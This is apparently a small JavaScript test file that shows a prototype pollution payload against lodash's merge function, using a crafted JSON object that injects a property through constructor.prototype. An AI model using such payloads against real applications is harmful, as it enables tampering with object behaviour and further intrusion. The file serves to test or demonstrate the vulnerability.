// test_lodash_vuln.js
const _ = require('lodash');
let payload = '{"constructor": {"prototype": {"bad": "inject"}}}';
let obj = JSON.parse(payload);
_.merge({}, obj);  // Prototype pollution
